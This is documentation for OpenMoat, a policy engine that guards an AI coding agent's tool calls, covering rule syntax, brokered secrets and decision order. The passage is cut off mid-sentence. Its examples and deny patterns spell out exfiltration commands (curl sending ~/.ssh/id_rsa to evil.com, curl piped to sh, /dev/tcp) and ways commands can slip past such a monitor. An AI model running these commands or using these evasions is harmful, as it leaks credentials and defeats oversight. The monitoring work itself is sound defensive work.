# Policy reference (schema v1)

[README](../README.md) · [Docs index](README.md) · [openmoat.dev/docs](https://openmoat.dev/docs/)

> [!NOTE]
> **Read this when** you write or read a policy file: the schema, rule kinds, pattern syntax, evaluation order and the default policy.

**On this page:** [1. Shape](#1-shape) · [2. Rule groups](#2-rule-groups) · [3. Pattern syntax](#3-pattern-syntax) · [4. How a decision is made](#4-how-a-decision-is-made) · [5. Verdicts and what the host does](#5-verdicts-and-what-the-host-does) · [6. The default policy, in one table](#6-the-default-policy-in-one-table) · [7. Recipes](#7-recipes) · [8. The policy lock](#8-the-policy-lock) · [9. Host sandboxes (sandbox:)](#9-host-sandboxes-sandbox) · [10. Repository policy](#10-repository-policy)

A policy is a YAML document that tells OpenMoat what an agent may do. The installed
user policy lives at `~/.moat/policy.yaml` (or `$MOAT_HOME/policy.yaml`).
`moat init` writes the default; `moat policy lint` validates; `moat policy check`
explains a decision. A project can add rules of its own in `<project>/.moat/policy.yaml`
(§10).

A decision is not itself enforced by the operating system: `allow` means the host runs
the tool call with your permissions. Where a host sandbox (§9) or `moat run` applies,
the operating system also bounds what the call can reach ([SANDBOX.md](SANDBOX.md)).

## 1. Shape

```yaml
version: 1                          # required; only 1 is supported

defaults:                           # verdict when no rule matches: allow, defer, ask or deny
  "*": defer                        #   one verdict for everything, or a map per kind
  net: deny                         #   keys other than the ten kinds and "*" are accepted but never consulted
  fetch: defer                      #   unset, a fetch takes the `net` default
  web.search: allow                 #   only `defaults` decide a web search; unset, it takes "*"
  tool.unknown: defer               #   only `defaults` decide a tool the adapter cannot classify; unset, it takes "*"

deny:   [ <rule group>, … ]         # evaluated first; a match here is final
allow:  [ <rule group>, … ]         # evaluated second
ask:    [ <rule group>, … ]         # evaluated third: OpenMoat asks the person itself
defer:  [ <rule group>, … ]         # evaluated fourth: the agent's own permission prompt decides

executables:                        # pin program names to absolute paths (enforced, see §8.1)
  git: ["/usr/bin/git", "/opt/homebrew/bin/git"]

sandbox:                            # optional: what the host sandboxes may read beyond the rules (§9)
  read_roots: ["/usr", "~/.cargo"]
  proxy_port: 18080                 # optional, opt-in: send host sandbox traffic through `moat proxy` (§9)
  proxy_allow_ech: false            # optional: let `moat proxy` forward encrypted server names (ECH) (§9)
  package_min_release_age_days: 7   # optional: `moat run` keeps npm and uv off versions newer than this; 0 is off (§9.1)

secrets:    [ <secret>, … ]         # values OpenMoat keeps from the agent (§2.1)

taint:                              # optional: more paths session taint protects (§4.1)
  protected_writes: ["**/deploy/**"]
  provenance: true                  # optional, default true: taint follows written files (§4.1.1)

require_signed_repo_policy: false   # optional: trust a repository policy only when signed by a trusted key (§10)

mcp:                                # optional: how `moat mcp proxy` treats a new server (§8)
  trust_first_sight: false          # optional, default false: pin its first tool listing unseen
```

`approval:` (`channel`, `remember`, `timeout_s`) and `scope:` (`project_roots`) are reserved:
they are accepted so older policy files stay valid, have no effect yet, and `moat policy lint`
says so. Approvals are made with `moat allow` (§8.2); the project root is the git root of the
call's working directory (§3.2).

`defer` (ADR-025) means OpenMoat neither objects nor approves: the agent's own permission
flow decides the call, exactly as it would without OpenMoat (§5). `ask` means OpenMoat asks
the person itself. The default policy defers what it does not know and keeps `ask` for the
few calls whose effect outlives the sandbox or the session (§6).

Unknown keys are rejected. Rule ids must be unique across all four lists and must
not be empty; a rule group must contain at least one pattern.

The file is YAML 1.2, read strictly (ADR-024): a key repeated in one mapping, a merge key
(`<<`) and a tag OpenMoat does not know (`!env`) are errors, only `true` and `false` are
booleans (`yes`, `no`, `on`, `off` are text), and anchors and aliases (`&paths`, `*paths`)
work as usual.

## 2. Rule groups

```yaml
- id: secrets-paths                 # stable id; shown to the agent and stored in the audit log
  reason: secret material           # optional; prefixed to the explanation
  fs.read:  ["~/.ssh/**", "**/.env"]
  fs.write: ["~/.ssh/**"]
  shell:    ["curl * | sh"]
  net:      ["*.evil.example"]
  fetch:    ["docs.rs"]
  env.read: ["*_TOKEN"]
  env.set:  ["PATH", "LD_PRELOAD"]
  mcp:      ["mcp__shell__*"]
```

A group matches when **any** of its patterns matches an atomic action of the same
kind. One tool call usually produces several atomic actions (see §4).

A `deny` group may also say `hook_only: true` (additive to schema v1, ADR-034). The
hook applies it like any other deny rule: a shell command, file tool or MCP argument
that names one of its `fs.read` or `fs.write` paths is denied. The host sandboxes and
`moat run` leave those paths out and treat them as the other rules say, so a program a
sandboxed command runs can still open them. The default policy uses it for
`build-credentials` (§6): `mvn` and `gradle` must read their settings inside the
sandbox. `policy lint` rejects `hook_only` on an `allow`, `ask` or `defer` group, with
`net` or `fetch` patterns (sandboxed commands would reach hosts the hook denies), and on
a group without `fs.read` or `fs.write`; `policy compile` lists such groups under
`decide-only`.

| Kind | Matched against | Pattern language |
|---|---|---|
| `shell` | the normalised argument vector of a command, and of every pipeline suffix | token sequence (§3.1) |
| `fs.read`, `fs.write` | the canonical absolute path | glob (§3.2) |
| `net` | the host name only (no scheme, port or path), lowercase; also matches `fetch` actions | glob, case-insensitive |
| `fetch` | the host of a URL a host's own fetch tool reads (Claude Code `WebFetch`), as for `net` | glob, case-insensitive |
| `web.search` | a query a host's own search tool sends to the host's search provider (Claude Code and Cursor `WebSearch`); the agent chooses the words, not the host | none: no rule group lists it, so `defaults.web.search` (else `"*"`) decides it, and session taint (§4.1) tightens it |
| `tool.unknown` | a host tool the adapter cannot classify: an unknown Cursor `preToolUse` tool that names no path key OpenMoat reads | none: `defaults.tool.unknown` (else `"*"`) decides it, and session taint (§4.1) tightens it; `moat allow` cannot approve it |
| `env.read`, `env.set` | the variable name | glob |
| `mcp` | the full MCP tool name `mcp__<server>__<tool>` | glob |

### 2.1 Brokered secrets (`secrets:`)

```yaml
secrets:
  - id: gh                          # lowercase letters, digits, `-`; unique
    host: api.github.com            # one host, exact: lowercase DNS name or IPv4, no pattern or port
    header: Authorization           # the request header the value goes in
    source: { env: GITHUB_TOKEN }   # or { file: ~/.config/moat/gh } or { keychain: { service: moat, account: gh } }
    plain_http: false               # optional; true also injects into plain-HTTP (clear-text) requests
```

`moat secret add gh` adds exactly this entry, shows the diff and asks, then re-pins and
runs `moat sandbox sync`. When no deny rule covers the source yet (an `env` name the
policy does not deny, a `file` outside the secret paths), it also adds one, first in
`deny:` and in the same diff: `secret-<id>` with an `env.read` or `fs.read` of the
source, so the agent cannot read the value it brokers. For another secret: `moat secret add <id> --host <host>
[--header <name>] (--env NAME | --file PATH)`; the header defaults to `Authorization`.

A brokered secret is kept by OpenMoat, not by the agent (ADR-020). The agent holds the
placeholder `moat-secret:<id>:placeholder` instead of the value. `moat proxy` reads the
value from `source` and is the only OpenMoat component that uses it (Claude Code's
sandbox can broker it too, below).

- **`source`.** `file` is absolute or under `~/`; the value is its contents without the
  trailing newline. `env` is a variable of the `moat proxy` process. `keychain` is an item
  in the operating system's keychain.
- **`header`** must be an HTTP header name. Headers that frame the request or the
  connection (`Host`, `Content-Length`, `Transfer-Encoding`, `Connection`, `Proxy-*`, …)
  are refused. Two secrets cannot set the same header for the same host.
- **`plain_http`** is off unless set. A plain-HTTP request carries the value in clear text,
  readable by anyone on the network path, so OpenMoat injects into one only for a secret
  that says `plain_http: true`.
- **Never wider.** A secret opens nothing: its host still needs a `net` or `fetch` allow
  rule, or the proxy refuses it.
- **Lint.** `moat policy lint` warns in four cases:
  - no allow rule names the host;
  - no deny rule covers a `file` source (`fs.read`) or an `env` source (`env.read`), so
    the agent could read the value itself;
  - `plain_http: true` is set for a host that is not loopback (`localhost`, `*.localhost`,
    `127.0.0.0/8`);
  - `plain_http: true` is set for a loopback host: the proxy never connects to a loopback
    address, so the secret is never injected.

What the proxy does with them:

- **Injection, plain HTTP with `plain_http: true` only.** In a plain-HTTP request to
  `host` (any port), every `header` line has the placeholder replaced by the value. When
  the request has no such header, `header: <value>` is added. The placeholder elsewhere
  (the path, other headers) is left as it is. The value then crosses the network in clear
  text.
- **Without `plain_http`** the request is forwarded unchanged, still carrying the
  placeholder, and the server rejects it. The audit row says
  ``secret `<id>` not injected``.
- **HTTPS (CONNECT)** is not decrypted, so a request there carries the placeholder and
  the server rejects it. Injection into HTTPS needs opt-in TLS termination, which is not
  built (#172).
- **Leak blocking.** The proxy refuses a request to any other host that carries the
  placeholder or the value, in its head or plain-HTTP body (`proxy-secret`, §5.1).
  `moat guard` already denies the call that would send it (`placeholder-egress`, §6): a
  placeholder (`moat-secret:<id>:placeholder`, any letter case) in a fetch or network
  tool's URL, an MCP URL argument, a web search, or the arguments of a command that
  connects to a host, when the destination is not `host`. A placeholder whose id the
  policy does not broker belongs to no host, so it is denied wherever it goes.
- **Audit masking.** A value of 8 bytes or more is replaced by `[redacted]` wherever it
  occurs in an audit row the proxy records, and in the row of a call `moat guard`
  decides when its source is a `file` or `env` the guard can read (ARCHITECTURE.md §7).

`moat proxy` reads every source at start-up and refuses to start (exit 64) if one cannot
be read or holds a control character. It prints each secret's id, host, header and
placeholder, which is what to give the agent (for example
`GITHUB_TOKEN=moat-secret:gh:placeholder`), and never the value. A keychain source uses
`/usr/bin/security` on macOS and `/usr/bin/secret-tool` (libsecret) on Linux. Keychain
sources are not supported on Windows yet.

Claude Code's sandbox can also broker them itself, inside HTTPS. `moat sandbox sync`
writes each secret with an `env` or `file` source whose host a `net` allow rule names
as a Claude Code `mask` entry for that one host, and turns on Claude Code's
`network.tlsTerminate`, which masking needs. Sandboxed commands then see Claude Code's
own placeholder in that variable or file, and Claude Code's proxy sends the value to the
host. The value is read by Claude Code from the same source, not by `moat proxy`. A
secret Claude Code cannot mask (a `keychain` source, a host outside `net` allow, or a
`plain_http: true` secret beside HTTPS-only ones) is left to `moat proxy` as above; on
macOS a `file` source is denied rather than masked. `moat sandbox show` and
`moat doctor` list what Claude Code does with each secret ([SANDBOX.md](SANDBOX.md#host-sandboxes-standard-tier)).

## 3. Pattern syntax

### 3.1 Shell patterns
Tokenised with the same lexer as commands, so `a|b` and `a | b` are equal.

- Each token is a glob matched against exactly one argument: `git push --force*` matches `git push --force-with-lease`.
- git's global options are the one normalisation: `git -C dir push --force`, `git -c k=v reset --hard` and `git --git-dir=x push …` are matched as `git push --force`, `git reset --hard` and `git push …`, and `-C`/`--git-dir`/`--work-tree` values are `fs.read`s. A `-c`/`--config-env` key outside a short inert list (`color.*`, `user.name`, `core.quotepath`, …), `--exec-path=` or an unknown global option can make git run a program (`core.fsmonitor`, `core.hooksPath`, `alias.*`, `credential.helper`, `include.path`, …), and `--git-dir` names the directory git takes its config and hooks from (one planted in the project with ordinary writes), so the command is also checked as written, which no `git <subcommand>` allow matches. The environment cannot do the same: setting any `GIT_*` variable (`GIT_DIR`, `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>`, `GIT_CONFIG_PARAMETERS`) is denied by `env-poison`.
- Tokens are compared as written; flags are not normalised. `rm -rf ~` does not match `rm -fr ~` or `rm -r -f ~`; list every spelling you mean, or guard the path instead: an `fs.write` rule sees every spelling of it (the default `destructive` rule denies `fs.write` of `~` and `/`).
- A bare `*` matches **any number** of arguments, including none: `sudo *` matches `sudo`, `curl * | sh` matches `curl -fsSL https://x | sh -s`.
- A pattern is a **prefix**: `git status` also matches `git status --short`.
- A leading `!` makes the pattern an exclusion within its list, as for globs (§3.2): `shell: ["find *", "!find * -exec*"]` allows `find . -name x` but not `find . -exec rm {} \;` (ADR-012).
- A trailing bare `$` ends the match: the command must have no further arguments. `env $` matches `env` alone, not `env FOO=1 git status`; `export -p $` matches `export -p` but not `export -p FOO`. A `$` anywhere else is an ordinary token, and a pattern that is only `$` is rejected by the linter (ADR-010).
- Pipelines and lists are matched per command **and** as whole suffixes, so `base64 -d | sh` is caught in `echo … | base64 -d | sh`. `|&` (pipe stdout and stderr) is a `|`.
- A decoder stage that feeds an interpreter reading stdin, anywhere later in the same pipe chain, is also reported as the canonical pipeline `<decoder> -d | <interpreter>` (`base64 -D x | tr a b | bash -s` → `base64 -d | bash`), so one rule `* -d | bash` covers every decoder spelling. An interpreter given a script file or inline code (`bash build.sh`, `sh -c …`) is not reading its program from stdin and does not produce it.
- A copy or move (`cp`, `mv`, `ln`, `rsync`, `scp`) into a directory writes the entry named after each source, not the directory (`shell/copy.rs`): `cp f ~/` and `cp -t ~ f` write `~/f`, `rsync -a dist ~/` writes `~/dist`. A destination is a directory when it ends with `/`, is `~`, `.`, `..` or `$HOME`, or is given with `-t DIR`/`--target-directory` (`cp`, `mv`, `ln`). Any other destination (`mv dir newname`, or anything under `-T`) may be replaced itself, so it stays the write; `mv` also writes each source, so `mv ~ /tmp/` is still a write of `~`. When the names copied in are not on the command line (a source ending with `/`, whose contents `rsync` copies; `~`, `.` or `..` as the source; a word the shell expands such as `*` or `$X`; or a remote source such as `host:f`) the directory itself stays the write, since any entry in it may be replaced. A remote `scp`/`rsync` destination (`host:/tmp/`, `rsync://host/m`) is on another machine and is not a local write.
- Commands inside `sh -c "…"`, `eval`, `$( … )`, backticks, subshells and wrappers (`sudo`, `env`, `xargs`, `timeout`, `nohup`, …) are classified as their own commands. A `)` with no matching `(`, or a `(` never closed, makes the command `unparseable`.
- A redirection to the data sink or to the command's own output is not a file write: `2>/dev/null`, `>/dev/null 2>&1`, `&>/dev/null`, `>/dev/stdout`, `2>/dev/stderr`, `>/dev/fd/1` and `>/dev/fd/2` add no `fs.write`, and `</dev/null`, `</dev/stdin` and `</dev/fd/0` add no `fs.read` (`shell/tables.rs`). The target is compared after the usual path resolution, so `2>/dev/../dev/null` is the sink too, while a glob (`>/dev/nul?`) is not. Every other device is a path like any other: `>/dev/tty`, `>/dev/fd/3`, `>/dev/stdin` and `>/dev/disk0` are writes, and `/dev/null` as a command operand (`cp x /dev/null`) is still checked as one. The rest of the command is classified as before, so `cat ~/.ssh/id_rsa 2>/dev/null` is still denied.
- A redirection to or from `/dev/tcp/HOST/PORT` or `/dev/udp/HOST/PORT`, in any form (`>`, `>>`, `<`, `<>`, `>&`, with or without a descriptor number, as in `exec 3<>/dev/tcp/HOST/PORT`), is a connection bash opens to `HOST`, so it is also a `net` action for `HOST`, judged like `curl` to it: an unlisted host is denied by `default.net`, `169.254.169.254` by `cloud-metadata`, and `127.0.0.1` defers (`local-net`). The path stays an `fs.read`/`fs.write` as well. Only that exact spelling in a redirection counts, as in bash: `/dev/../dev/tcp/…` and a program operand (`cat /dev/tcp/x/1`, a real path on Linux) are paths like any other. A host the line does not show (`/dev/tcp/$H/443`) is a `net` action for the text as written, which no allow rule names.
- A `<<<` here-string is the command's stdin, not a file: `cat <<< ~/.ssh/id_rsa` prints text and reads nothing. `$( … )` and `$VAR` inside it are evaluated like anywhere else (`cat <<< "$(curl …)"`, `curl -d @- … <<< "$GITHUB_TOKEN"`), and a shell or interpreter that reads its program from stdin runs it (`bash <<< 'cat ~/.ssh/id_rsa'` is classified as `cat ~/.ssh/id_rsa`).
- A here-document body is stdin data too. With an unquoted delimiter the shell expands `$( … )`, backticks and `$VAR` in it, so they are evaluated (`cat <<EOF` with a `$(curl …)` line is a network action); a quoted delimiter (`<<'EOF'`, `<<"EOF"`, `<<\EOF`) keeps the body literal. `<<-` strips leading tabs from every body line, as the shell does, before the body is classified. Either way a shell or interpreter reading its program from stdin runs the body (`bash <<'EOF'` is classified as the commands in it). The same holds one pipe later when the line shows the data: a bare `cat` passes on its here-document or here-string, and `echo`/`printf` their arguments, so `cat <<'EOF' | sh` and `echo 'cmd' | sh` are classified like `sh <<'EOF'`. Only `\n` is read in that text: any other escape, or a `printf` `%` format, means the line does not show what is printed (`printf '\x63at .env' | sh`), and the shell then asks. The output of any other program (`rev`, `tr`, `cat FILE`, `… | tee log | sh`) and of a `( … )` group is not followed either: the shell reading it is the atom `<shell> @stdin`, which `opaque-code` asks for.
- A shell's options are read the way the shell reads them, for `sh`, `bash`, `zsh`, `dash`, `ksh` and `fish`: `c` anywhere in a cluster (`bash -lc`, `sh -ec`, `zsh -ic`), long options (`--login`, `--norc`, `--rcfile FILE`; `sh` takes bash's, since it is bash on macOS and dash, which rejects them all, then runs nothing), options that take a value (`-o pipefail`, `+O extglob`) and `--` all lead to the same command string, which is classified on its own. `bash -o pipefail` reads its program from stdin; `pipefail` is not a script. An option the classifier does not know for that shell (`bash --frobnicate -c …`) makes the command `unparseable`, because it could consume the command string.
- The pattern of `grep`, `egrep` and `fgrep`, their first operand, is text grep never opens (`grep -n '\.env' notes.md` reads only `notes.md`), when only flags without a value (or `--name=value` options) come before it. With `-e`, `-f`, `--regexp` or `--file` anywhere on the line every operand is a file, since GNU grep finds options after operands too (`grep ~/.ssh/id_rsa -e x` reads the key); after any other option the word is checked as a path. `tr` takes character sets, never files; a word that is a path on its own (`/`, `/etc`) is still read.
- `fd`'s first operand is a regular expression, not a path, when only flags without a value come before it (`fd '\.rs$'`, `fd -H x`); after any other option it is checked as a path too. `gofmt -w` rewrites its operands, which become `fs.write`s, as does the `-cpuprofile` file. `command -v name` and `command -V name` only print how `name` resolves, so `name` is not classified as a command; plain `command name` runs it and is.
- `make` (and `gmake`) arguments that run code of the caller's choosing become their own `make <argument>` shell action, so a `make test*` allow does not cover them: `--eval`/`-E` text, `-e`/`--environment-overrides`, and the variables `SHELL`, `.SHELLFLAGS`, `MAKESHELL`, `MAKEFLAGS`, `MFLAGS`, plus any `NAME!=command`. The `--eval` text, `!=` commands, `$(shell …)` calls in variable values and the `SHELL=` program are classified as commands; `--file=`, `--makefile=`, `--directory=` and `--include-dir=` values are file reads. `make build -j4 CC=clang` is unaffected.
- Text tools (`sort`, `uniq`, `cut`; `shell/text.rs`) have their options read the way getopt reads them, GNU order included (options after operands). An option value is data, not a file: `cut -d '/' -f 2 x` reads only `x`. A value that follows an operand is also a file, since BSD getopt stops at the first operand. Files they write are `fs.write`s: `sort -o FILE`/`--output`/`-T DIR` and `uniq`'s second operand (`uniq in out`). An option the classifier does not know, including GNU abbreviations of long options, becomes its own `<program> @<option>` shell action (`sort @--compress-program=gzip`), which `text-tools` excludes, so the command asks.
- Option values that name files (`shell/path_options.rs`) are read in every spelling the tool takes: the next word (`cmake -B dir`), after `=` (`--target-dir=dir`) and, for a single-letter option, attached (`cmake -Bdir`). For `cmake`, `ctest`, `go`, `dotnet`, `mvn`, `gradle`, `cargo`, `make`, `npm`, `pnpm`, `yarn`, `tsc`, `pytest` (also `python -m pytest`), `uv`, `rake`, `rspec` (also `bundle exec rspec`), `phpunit`, `docker` and `swift`, an output or build directory is an `fs.write` (`cmake -B`/`--build`, `go build -o`, `dotnet -o`, `cargo --target-dir`, `pytest --basetemp`, `mvn -Dmaven.repo.local=`, …) and an input an `fs.read` (`cmake -S`, `go -C`/`-modfile`, `mvn -f`/`-s`, `gradle -p`, `make -C`/`-f`/`-I`, `uv run --directory`, …), so outside the project the default policy defers them. An option that loads code from a file or module (`cmake -C`/`-P`/`--toolchain`, `ctest -S`, `gradle -I`/`--init-script`, `cargo --config`, `pytest -p` other than `-p no:<name>`, `rake`/`rspec -r`/`--require`, `phpunit --bootstrap`, `dotnet test --test-adapter-path`) leaves the command `unparseable`, so no allow rule covers it (§4 step 5: the default policy defers it). For every program, a short option with a path attached (`-X/…`, `-X~/…`, `-X./…`, `-X../…`, `-X=/…`) is an `fs.read` and an `fs.write` of that path (`git diff -O/tmp/order`, `ssh -i~/.ssh/id_rsa`); `-j4`, `-O2`, `-DNAME=1`, a bare `/` (`tr -d/`), the backup suffix of `sed -i~` and patterns attached to `grep -e`, `rg -e`/`-g`, `ag -G` or a `tr` option are not paths, while `grep -f/x` reads `/x`.
- Database shells (`sqlite3`, `sqlite`, `duckdb`; `shell/database.rs`) open their database file read-write and create it when missing, so the database operand is an `fs.write`, a plain name included (`sqlite3 audit.db 'delete …'` after `cd ~/.moat` meets `kernel-self`). Their SQL and dot-commands open more files (`attach '…'`, `.open`, `.output`, `.backup`, `vacuum into '…'`), so every word that looks like a path in an SQL argument, a `-cmd`/`-c`/`-s` value or stdin the line shows is an `fs.write` too; a `file:` URI is its file. Only `-readonly` turns these into `fs.read`s. `-init FILE` is a read, and `:memory:` is no file. No default rule allows these tools (`.shell` runs programs), so they are never `allow` (the default policy defers them).
- A `sed` script is data too (`shell/sed/`): its words are not files (`sed -n '/^fn/,/^}/p' f` reads only `f`). The script is read with the commands and addresses GNU and BSD sed share (`p`, `d`, `s///`, `y`, `a`/`i`/`c`, `b`/`t`/`:`, `q`, `l`, `=`, `n`, `N`, `g`, `h`, `x`, `{}`, …). `r FILE`/`R FILE` are `fs.read`s and `w FILE`/`W FILE`/the `s///w FILE` flag `fs.write`s of `FILE` taken literally (sed does not expand `~`). A script that runs a command (`e`, the `s///e` flag), uses any other command, or cannot be read completely becomes a `sed @<script>` shell action, as do `-f FILE` (whose `FILE` is also an `fs.read`) and unknown options. `-i`/`--in-place` makes every file operand an `fs.write`, and its backup too (`-i.bak` writes `f.bak`; a suffix with `/` or `*`, which GNU sed reads as another directory, is reported). A bare `-i` is read both ways: GNU sed takes no suffix, BSD sed takes the next word. `-i ''` is the BSD empty suffix (the next operand is checked as a script and as a file), `-i -e …` gives BSD the suffix `-e`, and any other word after a bare `-i` (`sed -i 's/a/b/' f g`, a script to GNU and a suffix to BSD) is reported, except as the last two words with no script before them: in `sed -i 's/a/b/' f` BSD sed takes `f` as its script, has no file left to edit and stops before reading input, so when `f` holds no `w` (the only command that acts while the script is compiled) the command is GNU's reading alone and writes `f`.
- An `awk` program is data as well (`shell/awk.rs`); its words are not files (`awk '/error/ {print}' log` reads only `log`). awk stops reading options at the program, so only `-F` and `-v` before it are options, and every later word is a file or an assignment. A program containing `system`, a `|` that is not part of `||`, `getline`, `ENVIRON`, `ARGV` or `@` (gawk's `@include`, `@load`, indirect calls), or a `>` after its first `print` (output redirection), becomes an `awk @<program>` shell action, as do `-f FILE` and any other option. These words are looked for in the raw text, strings and regexes included, so quoting cannot hide them, and a string that happens to contain one asks.
- Only a `$` the shell expands is an `env.read`: an unquoted or double-quoted `$NAME`/`${NAME}` (`"$AWS_SECRET_ACCESS_KEY"` is a read), one in an unquoted here-document body, or one in a `<<<` word outside single quotes. The lexer records which part of each word came from single quotes, so `$p` in `sed -n '$p'` and `$NF` in `awk '{print $NF}'` read nothing, and in `'$p'"$TOKEN"` only `TOKEN` is read. Code handed to another shell is classified again as that shell sees it: `sh -c 'echo $SECRET'` and `eval 'echo $SECRET'` read `SECRET`. `$'…'` (ANSI-C quoting) is decoded the way bash decodes it (`\x2f` and `\057` are `/`, `\'` a quote), so `cat $'\x2f'Users/me/.ssh/id_rsa` is a read of that key and `$'moat'` is `moat`; a `$` in the decoded text is still scanned as if unquoted. `$"…"` (locale quoting) is read as `"…"`. A quoted here-document delimiter (`<<'EOF'`) keeps the body literal. `$1`-style field references are not variables and stay allowed. Where GNU and BSD sed would split a script differently (a delimiter inside a bracket expression, text after a label), or take a different word for the script (BSD stops at the first operand, so in `sed p -e x f` it runs `p` and reads `-e` and `x`), every reading is checked and the word stays a file too.
- A package install is read for the names it fetches from a registry (`shell/installs.rs`, ADR-030): `npm install|i|add`, `pnpm add`, `yarn add`, `yarn global add`, `bun add` (npm); `pip install` (`pip3`, `pip3.12`, `python -m pip`), `uv pip install`, `uv add`, `uv tool install`, `poetry add`, `pipx install` (PyPI); `cargo add` and `cargo install` (crates.io); `gem install` (RubyGems); `go get` and `go install` (Go modules). Versions, extras, markers and options are taken off each name (`requests==2.32`, `uvicorn[standard]`, `@types/node@20`, `serde@1`, `cobra@v1.8.0`). Paths, URLs, archives, git sources (`--git`, `--path`, `github:user/repo`) and requirement files name no registry package, and an install from the lockfile (`npm install`, `pip install -r requirements.txt`) names none. An install gives no atom of its own unless a name is a near miss, so it is decided by its command as before (a rule names a package through the command: `deny: shell: ["npm install event-stream"]`). A name that is not on the bundled list of popular names for its registry but is one edit away from a listed name of five characters or more (a letter added, dropped, changed or two swapped), differs from it only in `-`, `_` and `.` or in doubled letters, or adds or drops a squatter's prefix or suffix (`node-`, `-js`, `.js`, `python-`, `py`, `-py`, `rust-`, `-rs`, `ruby-`, …) gives the atom `@package-near-miss <ecosystem> <name> <popular name>`, with the ecosystem `npm`, `pypi`, `crates`, `rubygems` or `go`, which `package-near-miss` asks for (§6). Names are compared as each registry compares them: PyPI ignores case and treats `-`, `_` and `.` alike, crates.io ignores case and `-`/`_`, and a Go module's `/v2` suffix does not count.

### 3.2 Path, host and name globs
- `*` matches within one path segment; `**` matches across segments: `~/.ssh/**`, `**/.env.*`.
- Hosts are matched lowercase without userinfo, port, trailing dot or IPv6 brackets (`http://u@[::1]:8080/` is `::1`). A word with a scheme is always a URL, so `http://localhost`, `http://intranet` and numeric forms such as `http://2130706433/` are network actions; a word without a scheme counts only as a dotted name under a known top-level domain or an IPv4 address.
- `~` and `${project}` are expanded in patterns before matching; `${project}` is the git root above the call's working directory (or the directory itself when there is no repository). When the project root or the home directory is reached through a symlink (macOS `/tmp` → `/private/tmp`, `~/code` → `/Volumes/dev/code`, a Windows 8.3 short name), each pattern naming it is expanded for both spellings, exclusions included: `${project}/**` matches `/tmp/x/a` and `/private/tmp/x/a`, and `!${project}/.git/**` excludes both. When `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` or `CURSOR_CONFIG_DIR` moves `~/.moat`, `~/.claude`, `~/.codex` or `~/.cursor`, a pattern naming that directory or a path below it also matches the same path under the moved one (as written and with its symlinks resolved): with `CLAUDE_CONFIG_DIR=/srv/claude`, `~/.claude/settings.json` also matches `/srv/claude/settings.json`. The CLI reads the variables and the directories `moat init` recorded (`~/.moat/hosts.json`), and both are covered when they differ; the hook, `moat policy check`, `moat run` and the Standard-tier settings all see the moved directories. `$HOME` and `${HOME}` are expanded in the *action's* path (so `cat $HOME/.ssh/id_rsa` is seen as `~/.ssh/id_rsa`) but not in patterns: write `~` in rules.
- A leading `~name` in an action's path is a home directory, as the shell expands it: `~me/x` is `~/x` when `me` is the last component of your home directory. Any **other** `~<otheruser>` cannot be placed from the pure core: homes do not always sit next to each other (root's `/root` on Linux, homes under `/srv`, networked homes, Windows service accounts), so a guessed `/<parent-of-home>/<name>` could judge one path while the OS reads another. `~<otheruser>` is therefore unresolvable: a command naming it gets rule `unparseable` (§4 step 5), as `~-` already does, and `moat guard` never claims a cross-user path is allowed from a layout guess (#400). `~+` is the working directory. `~-` (the shell's previous directory) cannot be known, so a command naming it gets rule `unparseable`.
- The project root is never the home directory, one of its ancestors or a filesystem root (`/`, `C:/`, a UNC share), compared as written and with symlinks resolved. A git root that is one of these (a dotfiles repository in `~`) is skipped in favour of the working directory itself; when that is one too (a session started in `~` or `/`), the call has **no project**: every pattern naming `${project}` matches nothing (and a negated one excludes nothing), so project-scoped allows do not apply and those actions fall through to `ask`, `defer` and the defaults. Deny rules are unaffected. A project root whose path holds a glob character (`*`, `?`, `[`, `]`, `{`, `}`) is treated the same way: spliced into `${project}/**` it would match far more than the project. `moat policy check --project ~` is refused with exit 64.
- A pattern ending in `/**` also matches the directory itself: `~/.ssh/**` matches `~/.ssh`, so a recursive read (`grep -r . ~/.ssh`, `tar czf k.tgz ~/.ssh`) or a removal (`rm -rf ~/.gnupg`) of the directory meets the rule that guards its contents, and `!${project}/.git/**` also excludes `.git` itself.
- A recursive read of an *ancestor* of a guarded directory (`grep -r . ~`, `rg -uu . ~/.config`, `find ~`, `tar czf h.tgz ~`, `cp -r ~ …`, `zip -r`, `rsync -a`) is checked on the directory it names, which no deny rule matches. In the default policy no allow rule covers the home directory or `~/.config` either, and `home-sweep` asks for reading them, so the person sees the whole command; a user rule that allows reading `~` or `~/**` would allow them too, contents of `~/.ssh` included. Inside a project the project root is allowed by `project-fs`, so `grep -r TODO .` stays allowed even when the project holds a `.env`: denying every recursive search of a project would make the default unusable, and a named `.env` is still denied.
- A leading `!` excludes matches within the same list of the same group, in `deny`, `allow` and `ask` alike: a candidate matches when at least one positive pattern matches and no negated pattern does. Example: `fs.write: ["${project}/**", "!${project}/.git/**"]`.
- Paths are compared in slash-separated canonical form on every platform (`C:/Users/me/x` on Windows, never the `\\?\C:\…` verbatim form), case-insensitively on macOS and Windows.

## 4. How a decision is made

```
tool call ──► atomic actions ──► per action: deny → allow → ask → defer → defaults ──► strictest wins
```

1. The host's tool call becomes one `Action` (shell command, file read, file write, URL, MCP tool).
2. The classifier expands it into atomic actions. `curl -d @~/.ssh/id_rsa https://evil.com` becomes a `shell` action, an `fs.read` of `~/.ssh/id_rsa` and a `net` action for `evil.com`.
3. Each atomic action is evaluated in order `deny → allow → ask → defer`; the first list containing a match decides it. A repository policy's `ask` rules are tried right after `deny` (§10). If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
4. The verdict for the tool call is the **strictest** across its atomic actions: `deny > ask > defer > allow`.
5. A part of a call the classifier cannot model (an unknown shell option, a path after an unknown `cd`, a URL with no host) gets rule id `unparseable` and is never `allow`: it defers when the catch-all (`"*"`) is `allow` or `defer`, as in the default policy, and asks when the catch-all is `ask` or `deny`. Where this document says a command "is `unparseable`" or "gets rule `unparseable`", this is the verdict it means. A line the lexer cannot read in full (unbalanced quotes, unterminated `$(`, a `$'…'` that decodes to a NUL byte, more than 64 KB) or one past a classifier limit (nesting deeper than 4 levels, more than 2048 atomic actions, more than 16 directories after `cd`, more than 256 brace words) **asks** whatever the catch-all says: what was not read may hold a deny, and any line can be padded to reach a limit. Before giving up, the lexer reads a line as bash runs it: a here-document with no delimiter line ends at the end of the input, and a trailing backslash is a backslash, so a deny elsewhere on such a line stands. When only part of a call cannot be classified (one simple command or nested `$( … )` of a command line, a relative path after an unknown `cd`, one MCP URL argument with no host), that part is one more `unparseable` atom with that verdict and every other part is still decided; step 4 then applies, so `cd "$X" && cat notes 